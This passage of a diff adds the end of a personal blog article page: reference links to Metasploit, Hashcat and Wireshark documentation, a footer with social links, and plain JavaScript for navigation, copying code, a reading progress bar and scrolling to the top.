+            <li><a href="https://docs.metasploit.com/" target="_blank" rel="noopener noreferrer">Metasploit Framework Documentation</a></li>
+            <li><a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" rel="noopener noreferrer">Hashcat - Example Hashes &amp; Modes</a></li>
+            <li><a href="https://www.wireshark.org/docs/" target="_blank" rel="noopener noreferrer">Wireshark User Guide</a></li>
+        </ul>
+    </div>
+
+</article>
+
+<!-- ===== FOOTER ===== -->
+<footer>
+    <div class="footer-links">
+        <a href="https://github.com/joshfarias" target="_blank" rel="noopener noreferrer" aria-label="GitHub profile">
+            <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+            GitHub
+        </a>
+        <a href="https://www.linkedin.com/in/joshuafarias" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn profile">
+            <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
+            LinkedIn
+        </a>
+    </div>
+    <p>Josh Farias | 2026</p>
+</footer>
+
+<!-- Scroll to top button -->
+<button class="scroll-top" id="scrollTop" aria-label="Scroll to top">&#8593;</button>
+
+<script>
+(function () {
+    "use strict";
+
+    // Mobile nav
+    var toggle = document.getElementById("navToggle");
+    var links = document.getElementById("navLinks");
+    toggle.addEventListener("click", function () {
+        var isOpen = links.classList.toggle("open");
+        toggle.setAttribute("aria-expanded", isOpen);
+    });
+    links.querySelectorAll("a").forEach(function (a) {
+        a.addEventListener("click", function () {
+            links.classList.remove("open");
+            toggle.setAttribute("aria-expanded", "false");
+        });
+    });
+
+    // Copy code button
+    window.copyCode = function (btn) {
+        var codeBlock = btn.closest(".code-block");
+        var codeEl = codeBlock.querySelector(".code-body code");
+        var text = codeEl.textContent;
+        navigator.clipboard.writeText(text).then(function () {
+            var orig = btn.textContent;
+            btn.textContent = "Copied!";
+            btn.style.color = "#50fa7b";
+            setTimeout(function () { btn.textContent = orig; btn.style.color = ""; }, 1500);
+        });
+    };
+
+    // Reading progress bar
+    var progressBar = document.getElementById("readingProgress");
+    var article = document.getElementById("article-content");
+    window.addEventListener("scroll", function () {
+        var articleTop = article.offsetTop;
+        var articleHeight = article.offsetHeight;
+        var scrolled = window.scrollY - articleTop;
+        var viewableHeight = articleHeight - window.innerHeight;
+        if (scrolled < 0) {
+            progressBar.style.width = "0";
+        } else if (scrolled >= viewableHeight) {
+            progressBar.style.width = "100%";
+        } else {
+            progressBar.style.width = ((scrolled / viewableHeight) * 100) + "%";
+        }
+    }, { passive: true });
+
+    // Scroll to top button
+    var scrollBtn = document.getElementById("scrollTop");
+    window.addEventListener("scroll", function () {
+        if (window.scrollY > 400) {
+            scrollBtn.classList.add("visible");
+        } else {
+            scrollBtn.classList.remove("visible");
+        }
+    }, { passive: true });
+
+    scrollBtn.addEventListener("click", function () {
+        window.scrollTo({ top: 0, behavior: "smooth" });
+    });
+})();
+</script>
+
+</body>
+</html>
